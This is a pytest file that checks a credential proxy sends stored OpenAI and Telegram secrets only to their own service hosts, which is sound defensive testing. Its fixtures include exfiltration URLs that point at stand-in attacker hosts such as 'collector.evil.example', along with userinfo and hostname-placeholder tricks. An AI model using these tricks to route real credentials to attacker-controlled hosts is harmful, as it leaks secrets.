"""Security invariant: the SecurityProxy sends a stored credential only to
its own service's hosts.

Threat: a compromised gateway asks the proxy (POST /http) to inject the
OpenAI key or the Telegram bot token into a request to a server the
attacker controls. The gateway never sees the key, but the attacker
would. The proxy must refuse before any outbound request is made.
"""

from __future__ import annotations

import os
from pathlib import Path
from unittest.mock import MagicMock, patch

import httpx
import pytest

from mycelos.security.credential_hosts import credential_allows_url

TOKEN = "binding-test-token-123456789012345678901234567890"
PUBLIC_DNS = [(2, 1, 6, "", ("93.184.216.34", 0))]


# --- pure binding rules ----------------------------------------------------

@pytest.mark.parametrize("service,cred,url,ok", [
    ("openai", {}, "https://api.openai.com/v1/embeddings", True),
    ("openai", {}, "https://evil.example/v1/embeddings", False),
    ("openai", {}, "http://api.openai.com/v1/embeddings", False),  # no plain HTTP
    ("openai", {}, "https://api.openai.com.evil.example/", False),
    ("openai", {}, "https://api.openai.com@evil.example/", False),  # userinfo trick
    ("telegram", {}, "https://api.telegram.org/bot{credential}/getMe", True),
    ("telegram", {}, "https://{credential}.evil.example/", False),
    ("openai", {}, "https://api.telegram.org/bot/getMe", False),  # wrong service
    ("custom", {"api_base": "http://litellm.lan:4000"}, "http://litellm.lan:4000/v1/chat", True),
    ("custom", {"api_base": "http://litellm.lan:4000"}, "https://litellm.lan/v1", False),  # scheme differs
    ("custom", {"api_base": "http://litellm.lan:4000"}, "http://evil.example/v1", False),
    ("unknown", {}, "https://anything.example/", False),
    ("unknown", None, "https://anything.example/", False),
    ("openai", {}, "not a url", False),
])
def test_binding_rules(service, cred, url, ok) -> None:
    assert credential_allows_url(service, cred, url) is ok


# --- proxy endpoint ----------------------------------------------------------

@pytest.fixture
def proxy(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("MYCELOS_PROXY_TOKEN", TOKEN)
    monkeypatch.setenv("MYCELOS_MASTER_KEY", "binding-master-key")
    db = tmp_path / "proxy.db"
    monkeypatch.setenv("MYCELOS_DB_PATH", str(db))
    from mycelos.security.credentials import EncryptedCredentialProxy
    from mycelos.security.proxy_server import create_proxy_app
    from mycelos.storage.database import SQLiteStorage
    storage = SQLiteStorage(db)
    storage.initialize()
    creds = EncryptedCredentialProxy(storage, "binding-master-key")
    creds.store_credential("openai", {"api_key": "sk-secret-openai"})
    creds.store_credential("telegram", {"api_key": "123:secret-bot"})
    from starlette.testclient import TestClient
    return TestClient(create_proxy_app())


def _post(client, body: dict):
    with patch("mycelos.security.ssrf.socket.getaddrinfo", return_value=PUBLIC_DNS), \
         patch("mycelos.security.proxy_server.httpx") as mock_httpx:
        mock_resp = MagicMock(status_code=200, headers={}, text="ok", url=body["url"])
        mock_httpx.request.return_value = mock_resp
        mock_httpx.TimeoutException = httpx.TimeoutException
        mock_httpx.RequestError = httpx.RequestError
        resp = client.post("/http", json=body, headers={
            "Authorization": f"Bearer {TOKEN}", "X-User-Id": "default",
        })
        return resp, mock_httpx.request


@pytest.mark.parametrize("inject_as", ["bearer", "header:X-Api-Key", "url_path"])
def test_stored_key_never_reaches_a_foreign_host(proxy, inject_as) -> None:
    resp, outbound = _post(proxy, {
        "method": "POST", "url": "https://collector.evil.example/{credential}",
        "inject_credential": "openai", "inject_as": inject_as,
    })
    assert resp.status_code == 403
    assert "sk-secret-openai" not in resp.text
    outbound.assert_not_called()


def test_credential_placeholder_in_host_is_refused(proxy) -> None:
    resp, outbound = _post(proxy, {
        "method": "GET", "url": "https://{credential}.evil.example/",
        "inject_credential": "telegram", "inject_as": "url_path",
    })
    assert resp.status_code == 403
    outbound.assert_not_called()


def test_key_goes_to_its_own_service(proxy) -> None:
    resp, outbound = _post(proxy, {
        "method": "POST", "url": "https://api.openai.com/v1/embeddings",
        "inject_credential": "openai",
    })
    assert resp.status_code == 200
    assert outbound.call_args.kwargs["headers"]["Authorization"] == "Bearer sk-secret-openai"


def test_telegram_token_substitution_still_works(proxy) -> None:
    resp, outbound = _post(proxy, {
        "method": "GET", "url": "https://api.telegram.org/bot{credential}/getMe",
        "inject_credential": "telegram", "inject_as": "url_path",
    })
    assert resp.status_code == 200
    assert outbound.call_args.args[1] == "https://api.telegram.org/bot123:secret-bot/getMe"
    # The placeholder URL is echoed, never the resolved one.
    assert "secret-bot" not in resp.text


def test_requests_without_credentials_are_unaffected(proxy) -> None:
    resp, outbound = _post(proxy, {"method": "GET", "url": "https://example.org/page"})
    assert resp.status_code == 200
    outbound.assert_called_once()
